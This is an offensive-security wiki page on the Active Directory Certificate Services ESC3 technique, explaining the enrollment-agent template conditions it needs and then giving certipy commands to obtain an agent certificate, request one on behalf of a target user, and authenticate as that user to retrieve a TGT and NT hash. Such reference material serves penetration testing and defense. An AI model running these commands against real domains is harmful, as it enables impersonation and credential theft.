---
title: ESC3
description: Request a certificate on behalf of another user with an enrollment agent certificate
categories: [Active Directory, AD CS]
tags: [Active Directory, Privilege Escalation, Lateral Movement, AD CS]
weight: 2
---

One of the **Extended Key Usages (EKUs)** for certificates issued by AD CS is **Certificate Request Agent** (also called Enrollment Agent), which allows the holder to sign certificate requests on behalf of another user, subject to CA and template restrictions. The usual ESC3 chain needs two published templates matching the conditions below:

Condition 1: A template allows a low-privileged user to obtain an enrollment agent certificate.
- Enrollment rights are granted to a user or group we control.
- Manager approval is disabled.
- No authorized signatures are required.
- **Certificate Request Agent** is set as an EKU. An **Any Purpose** certificate or a certificate with no EKUs can provide an ESC2 path where accepted.

Condition 2: A target template permits enrollment on behalf of another user and issues a certificate usable for authentication.
- The target user must have enrollment rights; the CA's enrollment-agent restrictions must permit this agent, target user, and template.
- Manager approval is disabled.
- Schema version 1 templates such as `User` commonly accept agent enrollment. Version 2+ templates must be configured to accept the agent's signature and application policy; do not assume that zero required signatures makes them valid targets.
- An authentication-capable EKU, such as **Client Authentication**, is present.

The resulting certificate must also satisfy the DC's certificate mapping requirements. Unlike an arbitrary SAN request, a legitimate on-behalf-of request can have the target identity and SID populated by the CA; strong mapping does not universally prevent ESC3.

The attack chain is as follows:
1. Request a condition 1 certificate as the current user.
2. Use the condition 1 certificate to request a condition 2 certificate on behalf of the target user, which allows for client authentication.
3. Authenticate as the target user using the condition 2 certificate.

## Linux Perspective
First, we request a certificate with **Certificate Request Agent** listed as one of its EKUs, as our current controlled user. These commands use a requester ccache exported in `KRB5CCNAME`; `<ca_host>` is the CA server, not necessarily a DC.
```bash
certipy req -k -no-pass -ca '<ca_name>' -template "<agent_template>" -target "<ca_host>" \
-out controlled
```

Next, request a certificate on behalf of a target user (specified with `-on-behalf-of`), signing the request with the certificate and private key supplied through `-pfx`. If we are targeting a user account, the built-in `User` template is a possible target if it is published and the conditions above are met.
{{% alert title="Note" %}}
Use the target account's NetBIOS domain name in `-on-behalf-of` (`CONTOSO` rather than `CONTOSO.COM`); AD CS may reject other formats.
{{% /alert %}}
```bash
certipy req -k -no-pass -ca '<ca_name>' -template User -target '<ca_host>' \
-on-behalf-of '<netbios_domain>\<target_user>' -pfx controlled.pfx -out target
```

If we receive a usable certificate issued for the target user, we may Pass-the-Cert to obtain the user's TGT and attempt NT hash retrieval.
```bash
certipy auth -pfx target.pfx -dc-ip '<dc_ip>'
```
